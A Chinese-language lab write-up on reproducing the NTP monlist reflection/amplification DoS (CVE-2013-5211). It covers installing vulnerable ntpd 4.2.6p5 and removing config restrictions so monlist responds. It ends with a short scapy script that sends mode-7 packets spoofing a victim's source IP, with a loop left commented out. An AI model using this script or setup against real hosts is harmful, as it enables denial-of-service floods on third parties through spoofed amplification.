### 完整的ntp放大反攻击实验
​	最近需要做这么个实验，从服务器的搭建到攻击实现，走了很多曲折的道路，也花了很多时间，因为网上资料杂七杂八并不是很全，所以我现在整理一下。

​	放大反射dos攻击由CVE-2013-5211所致。且这漏洞是与molist功能有关。Ntpd4.2.7p26之前的版本都会去响应NTP中的mode7“monlist”请求。ntpd-4.2.7p26版本后，“monlist”特性已经被禁止，取而代之的是“mrulist”特性，使用mode6控制报文，并且实现了握手过程来阻止对第三方主机的放大攻击。所以我们需要安装之前的版本4.2.6p5。

​	那我们接着来看什么是 NTP 的反射和放大攻击，NTP 包含一个 monlist 功能，也被成为 MON_GETLIST，主要用于监控 NTP 服务器，NTP 服务器响应 monlist 后就会返回与 NTP 服务器进行过时间同步的最后 600 个客户端的 IP，响应包按照每 6 个 IP 进行分割，最多有 100 个响应包。

#### 一、ntp服务器的安装
1 解压文件

tar -xzvf ntp-4.2.6p5.tar.gz

2 编译安装

~~~
./configure --prefix=/usr/local/ntp --enable-all-clocks --enable-parse-clocks
~~~
~~~
make && make install
~~~
3 更改配置文件
~~~
restrict default kod nomodify notrap nopeer noquery

restrict -6 default kod nomodify notrap nopeer noquery
~~~
这两行的意思是允许发起时间同步的IP，与本服务器进行时间同步，但是不允许修改ntp服务信息，也不允许查询服务器的状态信息（如monlist），所以要把最后的noquery请求去掉，如何最后出问题的话，大概率是因为配置文件的问题。

如果有*disable monitor*也去掉。
~~~
![netstat](F:\python_work\amplification attack\pic\netstat.jpg)1）允许任何IP的客户机都可以进行时间同步
restrict default kod nomodify notrap nopeer noquery
这行修改成：
restrict default nomodify
2）只允许192.168.1.*网段的客户机进行时间同步
restrictdefault nomodify notrap noquery 表示默认拒绝所有IP的时间同步
之后增加一行：
restrict 192.168.1.0 mask 255.255.255.0nomodify
~~~
最后加上
~~~
server 127.127.1.0 
fudge 127.127.1.0 stratum 8
~~~
主要是解决同步时出现 no server suitable for synchronization found错误

4 启动服务
~~~
/usr/local/ntp/bin/ntpd -c /etc/ntp.conf -p /tmp/ntpd.pid
~~~

5 查看端口状态
~~~
netstat -tunlp | grep 123
~~~

![](F:\python_work\amplification attack\pic\netstat.jpg)

#### 二、 测试

1 运行命令，查看ntp服务器同步情况，出现LOCAL就行了。

~~~
./ntpq -p
~~~

![](F:\python_work\amplification attack\pic\1576048989(1).png)

2 在另外一台机器进行时间同步测试

~~~
ntpdate x.x.x.x
~~~

如果出现offset说明成功。

![](F:\python_work\amplification attack\pic\1576049151(1).jpg)

3 测试monlist功能

~~~
ntpdc -n -c monlist 192.168.19.129 | wc -l
~~~

![](F:\python_work\amplification attack\pic\1576049315(1).jpg)

返回数字说明成功，就可以运行攻击脚本了。

4 IP欺骗进行攻击（未完待续）

~~~
import sys
from scapy.all import *


def attack(target, ntp_server):
    send(IP(dst=ntp_server, src=target) / (UDP(sport=52816) / NTP(version=2, mode=7, stratum=0, poll=3, precision=42)))

if __name__ == "__main__":
    target = '192.168.19.133'
    ntp_server = '192.168.19.129'
    # while True:
    attack(target,ntp_server)
~~~

![](F:\python_work\amplification attack\pic\1576049487(1).jpg)

攻击效果



参考链接

<https://blog.csdn.net/qq_36294875/article/details/79491614>

<https://blog.csdn.net/qq_32350719/article/details/88663455>

<https://www.cnblogs.com/liubin0509/p/6282858.html>

<https://blog.csdn.net/wzq756984/article/details/73866231>